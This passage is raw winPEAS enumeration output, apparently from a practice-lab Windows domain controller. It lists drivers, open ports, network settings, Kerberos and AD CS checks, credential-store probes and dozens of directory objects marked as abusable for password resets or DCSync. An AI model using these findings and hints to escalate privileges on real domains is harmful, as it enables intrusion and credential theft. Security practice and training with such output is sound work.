    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 13.2.0.1022 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAV.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Microsoftr Windowsr Operating System - 10.0.14304.1001 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Microsoftr Windowsr Operating System - 10.0.14304.1001 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.603.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys
    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys
    MEGASAS RAID Controller Driver for Windows - 6.711.10.11 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys                                                                                                                                               
    QLogic iSCSI offload driver - 7.14.1.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    QLogic FCoE Offload driver - 7.14.4.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    VMware Pointing USB Device Driver - 12.5.10.0 build-14169150 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmusbmouse.sys
    VMware Pointing PS/2 Device Driver - 12.5.10.0 build-14169150 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 8.16.07.0008 - build-16233244 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 8.16.07.0008 - build-16233244 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.8.16.0 build-14217867 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys
    VMware server memory controller - 7.5.5.0 build-14903665 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information (T1016,T1049,T1135,T1046,T1018,T1090) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares (T1135)
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI) (T1135)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File (T1016)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts (T1016,T1018)
È The masks are only for the IPv4 addresses 
  [X] Exception: The requested protocol has not been configured into the system, or no implementation for it exists
    Ethernet0 2[A2:DE:AD:5C:01:E4]: 10.129.95.200, fe80::4160:79cb:5a05:8165%5, dead:beef::4160:79cb:5a05:8165 / 255.255.0.0
        Gateways: 10.129.0.1, fe80::250:56ff:fe94:c01e%5
        DNSs: 1.1.1.1, 1.0.0.1
    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports (T1049)
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                                            
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               88            0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         848             svchost
  TCP        0.0.0.0               389           0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               464           0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               593           0.0.0.0               0               Listening         848             svchost
  TCP        0.0.0.0               636           0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         3300            sqlservr
  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         1000            svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               9389          0.0.0.0               0               Listening         2424            Microsoft.ActiveDirectory.WebServices
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         484             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         304             svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         992             svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               49673         0.0.0.0               0               Listening         1580            svchost
  TCP        0.0.0.0               49674         0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               49675         0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               49678         0.0.0.0               0               Listening         2348            spoolsv
  TCP        0.0.0.0               49687         0.0.0.0               0               Listening         2392            dns
  TCP        0.0.0.0               49698         0.0.0.0               0               Listening         2436            dfsrs
  TCP        0.0.0.0               49705         0.0.0.0               0               Listening         612             services
  TCP        10.129.95.200         53            0.0.0.0               0               Listening         2392            dns
  TCP        10.129.95.200         139           0.0.0.0               0               Listening         4               System

  Enumerating IPv6 connections
                                                                                                                                                            
  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        80            [::]                                        0               Listening         4               System
  TCP        [::]                                        88            [::]                                        0               Listening         620             lsass
  TCP        [::]                                        135           [::]                                        0               Listening         848             svchost
  TCP        [::]                                        389           [::]                                        0               Listening         620             lsass
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        464           [::]                                        0               Listening         620             lsass
  TCP        [::]                                        593           [::]                                        0               Listening         848             svchost
  TCP        [::]                                        636           [::]                                        0               Listening         620             lsass
  TCP        [::]                                        1433          [::]                                        0               Listening         3300            sqlservr
  TCP        [::]                                        3268          [::]                                        0               Listening         620             lsass
  TCP        [::]                                        3269          [::]                                        0               Listening         620             lsass
  TCP        [::]                                        3389          [::]                                        0               Listening         1000            svchost
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        9389          [::]                                        0               Listening         2424            Microsoft.ActiveDirectory.WebServices
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         484             wininit
  TCP        [::]                                        49665         [::]                                        0               Listening         304             svchost
  TCP        [::]                                        49666         [::]                                        0               Listening         992             svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         620             lsass
  TCP        [::]                                        49673         [::]                                        0               Listening         1580            svchost
  TCP        [::]                                        49674         [::]                                        0               Listening         620             lsass
  TCP        [::]                                        49675         [::]                                        0               Listening         620             lsass
  TCP        [::]                                        49678         [::]                                        0               Listening         2348            spoolsv
  TCP        [::]                                        49687         [::]                                        0               Listening         2392            dns
  TCP        [::]                                        49698         [::]                                        0               Listening         2436            dfsrs
  TCP        [::]                                        49705         [::]                                        0               Listening         612             services
  TCP        [::1]                                       53            [::]                                        0               Listening         2392            dns
  TCP        [::1]                                       389           [::1]                                       49679           Established       620             lsass
  TCP        [::1]                                       389           [::1]                                       49680           Established       620             lsass
  TCP        [::1]                                       389           [::1]                                       54786           Established       620             lsass
  TCP        [::1]                                       1434          [::]                                        0               Listening         3300            sqlservr
  TCP        [::1]                                       49679         [::1]                                       389             Established       2464            ismserv
  TCP        [::1]                                       49680         [::1]                                       389             Established       2464            ismserv
  TCP        [::1]                                       54786         [::1]                                       389             Established       2392            dns
  TCP        [dead:beef::4160:79cb:5a05:8165]            53            [::]                                        0               Listening         2392            dns
  TCP        [fe80::4160:79cb:5a05:8165%5]               53            [::]                                        0               Listening         2392            dns
  TCP        [fe80::4160:79cb:5a05:8165%5]               135           [fe80::4160:79cb:5a05:8165%5]               55420           Established       848             svchost
  TCP        [fe80::4160:79cb:5a05:8165%5]               389           [fe80::4160:79cb:5a05:8165%5]               54777           Established       620             lsass
  TCP        [fe80::4160:79cb:5a05:8165%5]               389           [fe80::4160:79cb:5a05:8165%5]               54780           Established       620             lsass
  TCP        [fe80::4160:79cb:5a05:8165%5]               389           [fe80::4160:79cb:5a05:8165%5]               54784           Established       620             lsass
  TCP        [fe80::4160:79cb:5a05:8165%5]               49667         [fe80::4160:79cb:5a05:8165%5]               49689           Established       620             lsass
  TCP        [fe80::4160:79cb:5a05:8165%5]               49667         [fe80::4160:79cb:5a05:8165%5]               49782           Established       620             lsass
  TCP        [fe80::4160:79cb:5a05:8165%5]               49667         [fe80::4160:79cb:5a05:8165%5]               55421           Established       620             lsass
  TCP        [fe80::4160:79cb:5a05:8165%5]               49689         [fe80::4160:79cb:5a05:8165%5]               49667           Established       2436            dfsrs
  TCP        [fe80::4160:79cb:5a05:8165%5]               49782         [fe80::4160:79cb:5a05:8165%5]               49667           Established       620             lsass
  TCP        [fe80::4160:79cb:5a05:8165%5]               54777         [fe80::4160:79cb:5a05:8165%5]               389             Established       2392            dns
  TCP        [fe80::4160:79cb:5a05:8165%5]               54780         [fe80::4160:79cb:5a05:8165%5]               389             Established       2436            dfsrs
  TCP        [fe80::4160:79cb:5a05:8165%5]               54784         [fe80::4160:79cb:5a05:8165%5]               389             Established       2436            dfsrs
  TCP        [fe80::4160:79cb:5a05:8165%5]               55420         [fe80::4160:79cb:5a05:8165%5]               135             Established       5596            C:\ProgramData\winPEASany.exe
  TCP        [fe80::4160:79cb:5a05:8165%5]               55421         [fe80::4160:79cb:5a05:8165%5]               49667           Established       5596            C:\ProgramData\winPEASany.exe

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports (T1049)
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                                            
  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            316               svchost
  UDP        0.0.0.0               389           *:*                            620               lsass
  UDP        0.0.0.0               500           *:*                            992               svchost
  UDP        0.0.0.0               3389          *:*                            1000              svchost
  UDP        0.0.0.0               4500          *:*                            992               svchost
  UDP        0.0.0.0               5050          *:*                            316               svchost
  UDP        0.0.0.0               5353          *:*                            720               svchost
  UDP        0.0.0.0               5355          *:*                            720               svchost
  UDP        10.129.95.200         88            *:*                            620               lsass
  UDP        10.129.95.200         137           *:*                            4                 System
  UDP        10.129.95.200         138           *:*                            4                 System
  UDP        10.129.95.200         464           *:*                            620               lsass
  UDP        127.0.0.1             49508         *:*                            992               svchost
  UDP        127.0.0.1             50251         *:*                            620               lsass
  UDP        127.0.0.1             51670         *:*                            5596              C:\ProgramData\winPEASany.exe
  UDP        127.0.0.1             52512         *:*                            2708              dfssvc
  UDP        127.0.0.1             52632         *:*                            720               svchost
  UDP        127.0.0.1             59577         *:*                            2424              Microsoft.ActiveDirectory.WebServices
  UDP        127.0.0.1             59578         *:*                            2436              dfsrs
  UDP        127.0.0.1             60172         *:*                            2348              spoolsv
  UDP        127.0.0.1             64048         *:*                            2464              ismserv

  Enumerating IPv6 connections
                                                                                                                                                            
  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            316               svchost
  UDP        [::]                                        389           *:*                            620               lsass
  UDP        [::]                                        500           *:*                            992               svchost
  UDP        [::]                                        3389          *:*                            1000              svchost
  UDP        [::]                                        4500          *:*                            992               svchost
  UDP        [::]                                        5353          *:*                            720               svchost
  UDP        [::]                                        5355          *:*                            720               svchost
  UDP        [dead:beef::4160:79cb:5a05:8165]            88            *:*                            620               lsass
  UDP        [dead:beef::4160:79cb:5a05:8165]            464           *:*                            620               lsass
  UDP        [fe80::4160:79cb:5a05:8165%5]               88            *:*                            620               lsass
  UDP        [fe80::4160:79cb:5a05:8165%5]               464           *:*                            620               lsass

ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules (T1016)
È Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70-- (T1016)
    Entry                                 Name                                  Data
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration (T1090)
  General Settings
  Hive        Key                                       Value
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        CertificateRevocation                     1
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps                                                                                                                                                 
  No URLs configured

  Zone Auth Settings                                                                                                                                        
  No Zone Auth Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Internet Connectivity (T1016)
È Checking if internet access is possible via different methods 
    HTTP (80) Access: Not Accessible
  [X] Exception:       Error: A task was canceled.
    HTTPS (443) Access: Not Accessible
  [X] Exception:       Error: TCP connect timed out
    HTTPS (443) Access by Domain Name: Not Accessible
  [X] Exception:       Error: A task was canceled.
    DNS (53) Access: Not Accessible
  [X] Exception:       Error: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond                                                                                                    
    ICMP (ping) Access: Not Accessible
  [X] Exception:       Error: Ping failed: TimedOut

ÉÍÍÍÍÍÍÍÍÍÍ¹ Hostname Resolution (T1016)
È Checking if the hostname can be resolved externally 
  [X] Exception:     Error during hostname check: An error occurred while sending the request.


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Active Directory Quick Checks (T1018,T1087.002,T1558.003,T1484.001,T1649,T1003) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ gMSA readable managed passwords (T1003)
È Look for Group Managed Service Accounts you can read (msDS-ManagedPassword) https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gmsa.html                                                                                                                                                  
  [-] No gMSA with readable managed password found (checked 0).

ÉÍÍÍÍÍÍÍÍÍÍ¹ Kerberoasting / service ticket risks (T1558.003)
È Enumerate weak SPN accounts and legacy Kerberos crypto https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html
  [-] Domain default supported encryption types not set (legacy compatibility defaults to RC4).
  krbtgt supports: Unspecified (inherits defaults / RC4 compatible) - RC4 TGTs can still be issued.
È Checked 2 SPN-bearing accounts. High-risk RC4/privileged targets: 0, long-lived AES-only targets: 0.
  No obvious Kerberoastable service accounts detected with current visibility.

ÉÍÍÍÍÍÍÍÍÍÍ¹ AD object control surfaces (T1484.001,T1087.002,T1018)
È Look for objects where you have GenericAll/GenericWrite/attribute rights for ACL abuse (password reset, SPN/UAC/RBCD, sidHistory, delegation, DCSync). https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html#acl-abuse                                                            
  [+] Found 84 object(s) where your principal has abuse-friendly rights:
    -> Access Control Assistance Operators (group)
       DN: CN=Access Control Assistance Operators,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Account Operators (group)
       DN: CN=Account Operators,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Administrator (user)
       DN: CN=Administrator,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Administrators (group)
       DN: CN=Administrators,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> AdminSDHolder (container)
       DN: CN=AdminSDHolder,CN=System,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> aldom (user)
       DN: CN=Alessandro Dominguez,OU=London,OU=Employees,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> alice (user)
       DN: CN=Alice Chong,OU=Frankfurt,OU=Employees,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Allowed RODC Password Replication Group (group)
       DN: CN=Allowed RODC Password Replication Group,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> alyx (user)
       DN: CN=Alyx Walter,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> andrew (user)
       DN: CN=Andrew Wick,OU=New York,OU=Employees,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Backup Operators (group)
       DN: CN=Backup Operators,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Cert Publishers (group)
       DN: CN=Cert Publishers,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Certificate Service DCOM Access (group)
       DN: CN=Certificate Service DCOM Access,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> ckane (user)
       DN: CN=Christian Kane,OU=New York,OU=Employees,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Cloneable Domain Controllers (group)
       DN: CN=Cloneable Domain Controllers,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Cryptographic Operators (group)
       DN: CN=Cryptographic Operators,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> cyork (user)
       DN: CN=Connor York,OU=New York,OU=Employees,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> dai (user)
       DN: CN=Dai Aki,OU=Tokyo,OU=Employees,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> DefaultAccount (user)
       DN: CN=DefaultAccount,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Denied RODC Password Replication Group (group)
       DN: CN=Denied RODC Password Replication Group,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Developers (group)
       DN: CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Distributed COM Users (group)
       DN: CN=Distributed COM Users,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> DnsAdmins (group)
       DN: CN=DnsAdmins,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> DnsUpdateProxy (group)
       DN: CN=DnsUpdateProxy,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Domain Admins (group)
       DN: CN=Domain Admins,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Domain Computers (group)
       DN: CN=Domain Computers,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Domain Controllers group (group)
       DN: CN=Domain Controllers,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Domain Controllers OU (organizationalUnit)
       DN: OU=Domain Controllers,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Domain Guests (group)
       DN: CN=Domain Guests,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Domain Root (domainDNS)
       DN: DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Domain Users (group)
       DN: CN=Domain Users,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Enterprise Admins (group)
       DN: CN=Enterprise Admins,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Enterprise Key Admins (group)
       DN: CN=Enterprise Key Admins,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Enterprise Read-only Domain Controllers (group)
       DN: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Event Log Readers (group)
       DN: CN=Event Log Readers,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Group Policy Creator Owners (group)
       DN: CN=Group Policy Creator Owners,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Guest (user)
       DN: CN=Guest,CN=Users,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Guests (group)
       DN: CN=Guests,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Hyper-V Administrators (group)
       DN: CN=Hyper-V Administrators,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> IIS_IUSRS (group)
       DN: CN=IIS_IUSRS,CN=Builtin,DC=MEGACORP,DC=LOCAL
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
  [!] Additional 44 object(s) not shown (enable domain mode or run winPEAS with more time to enumerate all objects).

ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC (T1649)
È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
È Check for ADCS misconfigurations in the local DC registry
  StrongCertificateBindingEnforcement:  - Allow weak mapping if SID extension missing, may be vulnerable to ESC9.
  CertificateMappingMethods:  - Strong Certificate mapping enabled.
  [-] Certificate Authority not found. Skipping.
È 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4                                                                          
  [-] No templates with dangerous rights found (checked 0).


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Cloud Information (T1552.005,T1580) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
Learn and practice cloud hacking in training.hacktricks.xyz
AWS EC2?                                No
Azure VM?                               No
Azure Tokens?                           No
Google Cloud Platform?                  No
Google Workspace Joined?                No
Google Cloud Directory Sync?            No
Google Password Sync?                   No


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials (T1552.001,T1552.002,T1555.003,T1555.004,T1558,T1547.005,T1563.002) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                                                                                                                     

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault (T1555.004)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
Unable to enumerate vault items from the following vault: Windows Credentials. Error 0x1312
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager (T1555.004)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
Please run:
cmdkey /list

ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections (T1552.002)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings (T1563.002)
  RDP Server Settings
    Network Level Authentication            :
    Block Clipboard Redirection             :
